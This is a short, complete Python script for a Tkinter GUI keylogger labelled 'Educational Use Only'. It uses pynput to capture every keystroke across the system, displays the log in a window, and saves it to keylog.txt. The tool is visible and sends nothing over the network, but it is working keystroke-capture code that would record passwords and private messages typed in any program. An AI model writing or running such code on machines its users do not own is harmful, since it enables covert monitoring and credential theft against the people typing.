import tkinter as tk
from pynput import keyboard
import threading

# Global variables
log = ""
listener = None
is_logging = False

def on_press(key):
    global log
    try:
        log += key.char
    except AttributeError:
        log += f" [{key}] "
    update_display()

def update_display():
    log_display.delete("1.0", tk.END)
    log_display.insert(tk.END, log)

def start_keylogger():
    global listener, is_logging
    if not is_logging:
        is_logging = True
        listener = keyboard.Listener(on_press=on_press)
        listener.start()
        status_label.config(text="Keylogger Running 🟢", fg="green")

def stop_keylogger():
    global listener, is_logging
    if is_logging and listener:
        listener.stop()
        is_logging = False
        status_label.config(text="Keylogger Stopped 🔴", fg="red")

def save_log():
    with open("keylog.txt", "w") as f:
        f.write(log)

# GUI setup
root = tk.Tk()
root.title("Graphical Keylogger (Educational Use Only)")
root.geometry("500x400")
root.config(padx=20, pady=20)

tk.Label(root, text="🔐 Graphical Keylogger", font=("Arial", 16, "bold")).pack()

status_label = tk.Label(root, text="Keylogger Stopped 🔴", font=("Arial", 12), fg="red")
status_label.pack(pady=10)

log_display = tk.Text(root, height=10, width=60, font=("Courier", 10))
log_display.pack(pady=10)

btn_frame = tk.Frame(root)
btn_frame.pack(pady=10)

tk.Button(btn_frame, text="Start", command=start_keylogger, width=12, bg="green", fg="white").grid(row=0, column=0, padx=5)
tk.Button(btn_frame, text="Stop", command=stop_keylogger, width=12, bg="red", fg="white").grid(row=0, column=1, padx=5)
tk.Button(btn_frame, text="Save Log", command=save_log, width=12).grid(row=0, column=2, padx=5)

root.mainloop()
